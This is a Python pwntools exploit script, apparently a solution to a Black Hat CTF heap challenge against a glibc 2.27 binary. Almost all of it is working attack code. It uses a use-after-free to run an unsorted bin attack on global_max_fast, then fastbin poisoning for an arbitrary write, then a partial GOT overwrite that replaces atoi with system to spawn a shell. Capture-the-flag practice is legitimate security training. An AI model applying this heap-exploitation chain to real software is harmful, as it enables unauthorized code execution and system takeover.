from pwn import *
from pwn import p64, u64, p32, u32

# global_max_fast ubah dengan unsorted_bin_attack.c, jadi bisa fastbin attack
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

exe = ELF("./main_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        url = 'blackhat2-ea1a9ec94289cd9df8e692f6ce7c828e-0.chals.bh.ctf.sa'
        r = remote(url, 443, ssl=True, sni=url)

    return r

def create(r, size):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'size:\n', str(size).encode())

def edit(r, idx, payload):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'slot:', str(idx).encode())
    r.sendafter(b'robot:', payload)

def free(r, idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'slot:', str(idx).encode())

r = conn()

# Due to no leak, we need to bruteforce so that this solution will work only if the last two bytes
# of the libc base is 00 00 (0x0000)
global_max_fast = 0xd940
system_offset = 0xf420

# Fill tcache[0x110] until it got full
tcache_size = 0x108
offset_increment = 0x260 # Based on gdb observation, when we create the first chunk, the offset will be heap_offset + 0x260
for i in range(7): # We can do this because calloc doesn't use tcache
    create(r, tcache_size)
    free(r, 0)
log.info("Fulfill tcache...")
# pause()

# Create two chunk with size 0x108
# These will be used later
for i in range(2):
    create(r, tcache_size)

# Create huge chunk
max_size = 0x2700
create(r, max_size)

# Create small chunk, so that when we free huge chunk, it won't get consolidated
create(r, 0x111)
create(r, 0x111) # This will be used as fake chunk later. We need to set the size to 0x111

free(r, 2) # Go to unsorted bin
log.info("Now we have unsorted bin chunk")
# pause()

# With UAF, modify the unsorted bin chunk bk to the global_max_fast-0x10
payload = p64(0) + p64(global_max_fast-0x10)[:2]
edit(r,2, payload)
log.info("Now bk point to global_max_fast")
# pause()

# Now this create will overwrite global_max_fast to random huge value
create(r, max_size)
log.info("global_max_fast got overwritten")
# pause()

# Now, when we free our previous three chunks, it will go to fastbin
free(r,1)
free(r,0)
log.info("Now, we have fastbin chunk with size 0x110")
# pause()

# We are going to overwrite atoi got with system
atoi_got = exe.got['atoi']
log.info(f'atoi address: {hex(atoi_got)}')

# Points to the size of robots[4]
# Remember that fastbin is pretty strict with its chunk size, which is why we previously set
# The robots[4] size to 0x111, so that this can be used as a fake fastbin chunk with size 0x110
robot_memory_size_offset = 0x4040c8
edit(r,0,p64(robot_memory_size_offset)) # UAF,overwrite fastbin pointer to the robot memory size offset

create(r, tcache_size)
create(r, tcache_size) # Now robot[1] point to the desired offset. We now have arbitrary write
log.info(f'Now, robots[1] point to the desired offset')
pause()

payload = p64(1)*2
payload += p64(1)*3
payload += p64(atoi_got) # Set robots[0] to atoi GOT
edit(r,1,payload) # Arbitrary write
edit(r,0,p64(system_offset)[:2]) # Partial overwrite atoi to system
log.info(f'Now, atoi is changed to system')
pause()

# io.sendline('sh')

r.interactive() # Now, enter sh, and atoi(input) will be system("sh")